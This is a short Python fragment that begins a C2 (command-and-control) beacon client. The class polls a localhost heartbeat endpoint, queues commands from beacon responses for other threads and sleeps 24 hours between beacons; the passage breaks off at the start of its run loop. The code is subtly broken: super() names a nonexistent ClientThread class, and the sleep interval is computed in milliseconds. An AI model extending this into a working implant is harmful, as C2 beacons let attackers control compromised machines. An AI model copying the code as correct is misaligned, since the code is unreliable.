import threading
import http


class BeaconClient(threading.Thread):
    def __init__(self, master_queue, server_queue, client_queue):
        # `commands` is a Queue of commands from the main C2 client class
        super(ClientThread, self).__init__()
        self.endpoint = "http://localhost:5000/api/heartbeat/"
        self.master_queue = master_queue
        self.server_queue = server_queue
        self.client_queue = client_queue
        self.sleepTime = 24 * 60 * 60 * 1000    # 24 hours between beacons

        self.stop_request = threading.Event()

    # The master queue is populated using the raw input from the beacon
    # This class then hands off those commands where necessary to the other threads
    def run(self):
        # We loop through all the commands that have not yet been handled on the master queue,
        # then grab the commands off the beacon response and action those,
        # then sleep for the configured period of time
        while not self.stop_request.is_set():
